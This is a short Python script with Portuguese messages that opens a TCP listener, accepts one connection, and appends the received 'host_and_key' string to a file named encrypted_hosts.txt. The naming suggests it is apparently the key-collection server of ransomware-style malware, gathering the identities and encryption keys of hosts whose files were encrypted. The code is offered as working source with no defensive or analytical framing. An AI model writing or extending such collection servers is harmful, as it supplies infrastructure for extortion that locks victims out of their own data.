import socket

IP_ADDRESS = '192.168.0.121'
PORT = 5678

print ('Criando sockets')
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((IP_ADDRESS, PORT))
    print('Procurando conexoes...')
    s.listen(1)
    conn, addr = s.accept()
    print(f'Conexao de {addr} estabelecida!')
    with conn:
        while True:
            host_and_key = conn.recv(1024).decode()
            with open('encrypted_hosts.txt', 'a') as f:
                f.write(host_and_key+'\n')
            break
        print('Conexao completa e fechada!')
        
                